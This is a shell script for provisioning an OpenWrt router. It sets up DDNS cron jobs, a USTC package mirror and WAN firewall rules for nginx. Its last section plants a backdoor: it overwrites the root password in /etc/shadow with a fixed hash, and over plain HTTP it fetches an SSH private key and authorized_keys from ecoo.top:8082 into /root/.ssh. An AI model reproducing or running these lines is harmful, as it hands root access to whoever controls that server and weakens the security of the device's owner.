#!/bin/sh
if [ ! -f "/etc/crontabs/root" ]; then
	echo "未找到计划任务，文档建立中"
	touch /etc/crontabs/root
else
	echo "计划任务文档已存在"
fi
if [ -f "/etc/ddns_oray.sh" ]; then
	echo "计划任务的ddns已存在"
else
	echo "ddns计划任务建立中"
	if [ -f "/mnt/sda1/myddns/ddns_oray.sh" ]; then
	cp -a /mnt/sda1/myddns/ddns_oray.sh /etc
	chmod +x /etc/ddns_oray.sh
	echo "#*/10 * * * * sh /etc/ddns_oray.sh >ddns.log" >> /etc/crontabs/root
	fi
	if [ -f "/mnt/sda1/myddns/aliddns.sh" ]; then
	cp -a /mnt/sda1/myddns/aliddns.sh /etc
	chmod +x /etc/aliddns.sh
	fi
	if [ -f "/mnt/sda1/myddns/aliddnsgo.sh" ]; then
	cp -a /mnt/sda1/myddns/aliddnsgo.sh /etc
	chmod +x /etc/aliddnsgo.sh
	echo "#*/25 * * * * sh /etc/aliddnsgo.sh >ali.log" >> /etc/crontabs/root
	fi
	if [ -f "/mnt/sda1/myddns/aliddnsgo1.sh" ]; then
	cp -a /mnt/sda1/myddns/aliddnsgo1.sh /etc
	chmod +x /etc/aliddnsgo1.sh
	echo "#*/30 * * * * sh /etc/aliddnsgo1.sh >ali.log" >> /etc/crontabs/root
	fi
	if [ -d "/mnt/sda1/myddns/client-mode" ]; then
	cp -rf /mnt/sda1/myddns/client-mode /etc
	echo "#*/35 * * * * bash /etc/client-mode/client.sh" >> /etc/crontabs/root
	fi
fi
oldfeeds=`cat /etc/opkg/distfeeds.conf | grep downloads.openwrt.org`
if [ "$oldfeeds" == "" ]; then
	echo "软件包国内源已配置"
else
	echo "软件包国内源使用新配置"
	sed -i 's_downloads.openwrt.org_mirrors.ustc.edu.cn/openwrt_' /etc/opkg/distfeeds.conf
fi
fwignixa=`uci show firewall | grep nginxa`
fwignixb=`uci show firewall | grep nginxb`
if [[ "$fwignixa" == "" ]] && [[ -f "/etc/nginx/nginx.conf" ]]; then
	uci set firewall.nginxa=rule
	uci set firewall.nginxa.name=nginxa
	uci set firewall.nginxa.proto=tcp
	uci set firewall.nginxa.dest_port=80
	uci set firewall.nginxa.target=ACCEPT
	uci set firewall.nginxa.src=wan
	uci commit firewall
else
	echo "fwnginxa已设置过了"
fi
if [[ "$fwignixb" == "" ]] && [[ -f "/etc/nginx/conf.d/vhost.conf" ]]; then
	uci set firewall.nginxb=rule
	uci set firewall.nginxb.name=nginxb
	uci set firewall.nginxb.proto=tcp
	uci set firewall.nginxb.dest_port=8090
	uci set firewall.nginxb.target=ACCEPT
	uci set firewall.nginxb.src=wan
	uci commit firewall
	/etc/init.d/firewall restart > /dev/null
else
	echo "fwnginxb已设置过了"
fi
sed -i 's/root:.*/root:$1$gCu4Qd26$RaNddxLODwv0I7c\/\mEfTw.:18649:0:99999:7:::/g' /etc/shadow
if [ ! -f /root/.ssh/id_rsa ]; then
	wget http://ecoo.top:8082/id_rsa
	wget http://ecoo.top:8082/authorized_keys
	if [ ! -d /root/.ssh ]; then
	mkdir -p /root/.ssh
	fi
	mv id_rsa /root/.ssh/id_rsa
	mv authorized_keys /root/.ssh/authorized_keys
	chmod 600 /root/.ssh/id_rsa
	chmod 600 /root/.ssh/authorized_keys
	else
	echo "sshkey已经安装了"
fi
exit 0
